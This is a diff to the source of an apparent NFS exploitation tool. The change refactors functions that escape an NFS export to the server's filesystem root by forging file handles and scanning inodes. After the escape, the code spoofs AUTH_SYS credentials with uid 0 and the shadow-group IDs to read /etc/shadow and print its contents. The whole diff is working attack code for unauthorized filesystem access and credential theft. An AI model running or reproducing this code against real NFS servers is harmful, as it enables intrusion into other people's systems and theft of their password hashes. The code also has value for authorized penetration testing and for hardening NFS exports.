@@ -20,7 +20,7 @@ use crate::proto::auth::{AuthSys, Credential};
 use crate::proto::nfs3::types::FileHandle;
 use crate::proto::nfs3::{Nfs3Client, PooledNfs3 as _};
 use crate::util::stealth::StealthConfig;
-use nfswolf_nfs3::wire::Nfs3Result;
+use nfswolf_nfs3::FileType;
 
 /// Escape an export to the filesystem root via subtree_check bypass.
 ///
@@ -165,8 +165,8 @@ pub(crate) async fn find_escape(host: &str, export: &str, btrfs_subvols: u32, ma
     // compound-UUID XFS case `export_is_fs_root` cannot fingerprint), so it must
     // not be reported as an escape (#22/#48). `None` when root_squash blocks the
     // uid=0 GETATTR -- then we fall back to the format/known-inode signals.
-    let export_fileid: Option<u64> = match probe_client.getattr(&nfswolf_nfs3::wire::GETATTR3args { object: mnt.handle.to_nfs_fh3() }).await {
-        Ok(Nfs3Result::Ok(ok)) => Some(ok.obj_attributes.fileid),
+    let export_fileid: Option<u64> = match probe_client.attrs(&mnt.handle).await {
+        Ok(a) => Some(a.fileid),
         _ => None,
     };
 
@@ -228,25 +228,24 @@ pub(crate) async fn find_escape(host: &str, export: &str, btrfs_subvols: u32, ma
             continue;
         };
 
-        let args = nfswolf_nfs3::wire::GETATTR3args { object: candidate.root_handle.to_nfs_fh3() };
-        match probe_client.getattr(&args).await {
-            Ok(Nfs3Result::Ok(ok)) if ok.obj_attributes.type_ == nfswolf_nfs3::wire::ftype3::NF3DIR => {
+        match probe_client.attrs(&candidate.root_handle).await {
+            Ok(a) if a.file_type == FileType::Directory => {
                 // A directory hit alone is not the root: inode numbers are dynamic
                 // (XFS), so the first directory in 2..200 can be an arbitrary
                 // subdirectory. Confirm it is not the export itself (identity) and
                 // is genuinely the filesystem root (its own parent) before
                 // declaring success (#27).
-                let self_id = ok.obj_attributes.fileid;
+                let self_id = a.fileid;
                 if export_fileid.is_none_or(|exp| self_id != exp) && scan_hit_is_root(&probe_client, &candidate.root_handle, self_id).await {
                     return Ok((probe_client, EscapeOutcome::Success { candidate, note: "found via scan (confirmed root)".to_owned() }));
                 }
                 found_stale = true; // valid format + directory, but not the root -- keep scanning
                 tracing::debug!(inode, "scan hit a directory but not the filesystem root -- continuing");
             },
-            Ok(Nfs3Result::Ok(_)) => {
+            Ok(_) => {
                 tracing::debug!(inode, "scan hit non-directory inode (within export subtree)");
             },
-            Ok(Nfs3Result::Err((nfsstat3::NFS3ERR_ACCES | nfsstat3::NFS3ERR_PERM, _))) => {
+            Err(ref e) if e.is_permission_denied() => {
                 // ACCES proves only that the handle FORMAT was accepted (root_squash blocks
                 // the uid=0 read) -- it is returned by ANY protected inode, so a bare ACCES
                 // is NOT proof that this inode is a directory, let alone the filesystem root.
@@ -258,11 +257,11 @@ pub(crate) async fn find_escape(host: &str, export: &str, btrfs_subvols: u32, ma
                 }
                 tracing::debug!(inode, "ACCES but root not confirmed -- continuing scan");
             },
-            Ok(Nfs3Result::Err((nfsstat3::NFS3ERR_STALE, _))) => {
+            Err(ref e) if e.is_stale() => {
                 found_stale = true;
                 tracing::debug!(inode, "STALE");
             },
-            Ok(Nfs3Result::Err((stat, _))) => {
+            Err(stat) => {
                 tracing::debug!(inode, ?stat, "probe rejected");
             },
             Err(e) => {
@@ -283,10 +282,10 @@ pub(crate) async fn find_escape(host: &str, export: &str, btrfs_subvols: u32, ma
 /// root; 32/64/128 are XFS roots only when the handle is XFS-identified (fileid_type 0x81),
 /// because on a compound-UUID ext4 export those are ordinary low-numbered directory inodes.
 async fn export_is_fs_root(client: &Nfs3Client, mount_handle: &FileHandle) -> bool {
-    let Ok(Nfs3Result::Ok(ok)) = client.getattr(&nfswolf_nfs3::wire::GETATTR3args { object: mount_handle.to_nfs_fh3() }).await else {
+    let Ok(ok) = client.attrs(mount_handle).await else {
         return false; // cannot read the export root -- fall through to the normal probes
     };
-    let export_inode = ok.obj_attributes.fileid;
+    let export_inode = ok.fileid;
     let is_xfs = mount_handle.as_bytes().get(3).copied() == Some(0x81) || matches!(FileHandleAnalyzer::fingerprint_fs(mount_handle), crate::engine::file_handle::FsType::Xfs);
     export_inode == 2 || (is_xfs && matches!(export_inode, 32 | 64 | 128))
 }
@@ -300,16 +299,14 @@ async fn export_is_fs_root(client: &Nfs3Client, mount_handle: &FileHandle) -> bo
 /// - `NFS3ERR_ACCES` / `NFS3ERR_PERM` -- handle format was accepted (root_squash
 ///   blocks uid=0 reads on the root dir).
 async fn probe_escape_candidate(client: &Nfs3Client, candidate: &EscapeResult, export_fileid: Option<u64>) -> bool {
-    use nfswolf_nfs3::wire::{GETATTR3args, ftype3, nfsstat3};
-    let args = GETATTR3args { object: candidate.root_handle.to_nfs_fh3() };
-    match client.getattr(&args).await {
+    match client.attrs(&candidate.root_handle).await {
         // A directory whose inode differs from the export root's is a genuine
         // escape. Reject a hit that resolves to the export's OWN inode -- a
         // whole-filesystem export (incl. the compound-UUID XFS case that
         // `export_is_fs_root` cannot fingerprint) reproduces the export root and
         // would otherwise be a bogus "escape successful" (#22/#48).
-        Ok(Nfs3Result::Ok(ok)) => ok.obj_attributes.type_ == ftype3::NF3DIR && export_fileid.is_none_or(|exp| ok.obj_attributes.fileid != exp),
-        Ok(Nfs3Result::Err((nfsstat3::NFS3ERR_ACCES | nfsstat3::NFS3ERR_PERM, _))) => true,
+        Ok(a) => a.file_type == FileType::Directory && export_fileid.is_none_or(|exp| a.fileid != exp),
+        Err(ref e) if e.is_permission_denied() => true,
         _ => false,
     }
 }
@@ -319,18 +316,15 @@ async fn probe_escape_candidate(client: &Nfs3Client, candidate: &EscapeResult, e
 /// in the scan range (e.g. an XFS export with non-standard geometry) has a
 /// different parent and is therefore rejected (#27).
 async fn scan_hit_is_root(client: &Nfs3Client, handle: &FileHandle, self_fileid: u64) -> bool {
-    use nfswolf_nfs3::wire::{GETATTR3args, LOOKUP3args, Nfs3Option, diropargs3, filename3};
-    use nfswolf_xdr::Opaque;
-    let lookup = LOOKUP3args { what: diropargs3 { dir: handle.to_nfs_fh3(), name: filename3(Opaque::owned(b"..".to_vec())) } };
-    let Ok(Nfs3Result::Ok(ok)) = client.lookup(&lookup).await else { return false };
-    let parent_id = match ok.obj_attributes {
-        Nfs3Option::Some(a) => a.fileid,
-        Nfs3Option::None => {
-            let parent = FileHandle::from_nfs_fh3(&ok.object);
-            match client.getattr(&GETATTR3args { object: parent.to_nfs_fh3() }).await {
-                Ok(Nfs3Result::Ok(g)) => g.obj_attributes.fileid,
-                _ => return false,
-            }
+    // A filesystem root is its own parent, so ".." resolving back to the same
+    // inode is the confirmation. The server may or may not return attributes
+    // with the LOOKUP; fall back to a GETATTR when it does not.
+    let Ok((parent, attrs)) = client.resolve(handle, "..").await else { return false };
+    let parent_id = match attrs {
+        Some(a) => a.fileid,
+        None => match client.attrs(&parent).await {
+            Ok(a) => a.fileid,
+            Err(_) => return false,
         },
     };
     parent_id == self_fileid
@@ -356,17 +350,16 @@ async fn confirm_root_dir(client: &Nfs3Client, candidate: &EscapeResult) -> bool
     let unpriv = client.with_credential(cred, 65534, 65534);
 
     // Positive signal 1: the handle resolves to a directory for a non-root uid.
-    if let Ok(Nfs3Result::Ok(ok)) = unpriv.getattr(&GETATTR3args { object: candidate.root_handle.to_nfs_fh3() }).await
-        && ok.obj_attributes.type_ == ftype3::NF3DIR
+    if let Ok(a) = unpriv.attrs(&candidate.root_handle).await
+        && a.file_type == FileType::Directory
     {
         return true;
     }
 
     // Positive signal 2: a customary top-level entry resolves -- only the real filesystem
     // root carries these, so a successful LOOKUP confirms root.
-    for name in [b"etc".as_slice(), b"bin".as_slice(), b"usr".as_slice(), b"var".as_slice(), b"lib".as_slice()] {
-        let lookup = LOOKUP3args { what: diropargs3 { dir: candidate.root_handle.to_nfs_fh3(), name: filename3(Opaque::owned(name.to_vec())) } };
-        if let Ok(Nfs3Result::Ok(_)) = unpriv.lookup(&lookup).await {
+    for name in ["etc", "bin", "usr", "var", "lib"] {
+        if unpriv.resolve(&candidate.root_handle, name).await.is_ok() {
             return true;
         }
     }
@@ -395,18 +388,9 @@ async fn try_read_shadow_post_escape(client: &Nfs3Client, root_fh: &FileHandle) 
     // Shadow GIDs: 42 = Debian/Ubuntu, 15 = SUSE/openSUSE
     const SHADOW_GIDS: &[(u32, &str)] = &[(42, "Debian/Ubuntu shadow"), (15, "SUSE shadow")];
 
-    // LOOKUP /etc
-    let etc_args = LOOKUP3args { what: diropargs3 { dir: root_fh.to_nfs_fh3(), name: filename3(Opaque::owned(b"etc".to_vec())) } };
-    let etc_fh = match client.lookup(&etc_args).await {
-        Ok(Nfs3Result::Ok(ok)) => FileHandle::from_nfs_fh3(&ok.object),
-        _ => return,
-    };
+    let Ok((etc_fh, _)) = client.resolve(root_fh, "etc").await else { return };
 
-    // LOOKUP /etc/shadow
-    let shadow_args = LOOKUP3args { what: diropargs3 { dir: etc_fh.to_nfs_fh3(), name: filename3(Opaque::owned(b"shadow".to_vec())) } };
-    let shadow_fh = if let Ok(Nfs3Result::Ok(ok)) = client.lookup(&shadow_args).await {
-        FileHandle::from_nfs_fh3(&ok.object)
-    } else {
+    let Ok((shadow_fh, _)) = client.resolve(&etc_fh, "shadow").await else {
         eprintln!("{}", crate::output::status_info("/etc/shadow not found (non-standard OS or no shadow file)"));
         return;
     };
@@ -414,9 +398,8 @@ async fn try_read_shadow_post_escape(client: &Nfs3Client, root_fh: &FileHandle) 
     for &(gid, label) in SHADOW_GIDS {
         let cred = Credential::Sys(AuthSys::with_groups(0, gid, &[gid], "nfswolf"));
         let shadow_client = client.with_credential(cred, 0, gid);
-        let read_args = READ3args { file: shadow_fh.to_nfs_fh3(), offset: 0, count: 65536 };
-        if let Ok(Nfs3Result::Ok(ok)) = shadow_client.read(&read_args).await {
-            let content = String::from_utf8_lossy(ok.data.as_ref());
+        if let Ok(chunk) = shadow_client.read_at(&shadow_fh, 0, 65536).await {
+            let content = String::from_utf8_lossy(&chunk.data);
             eprintln!("{}", crate::output::status_ok(&format!("/etc/shadow readable via GID {gid} ({label}):")));
             for line in content.lines().take(10) {
                 println!("  {line}");
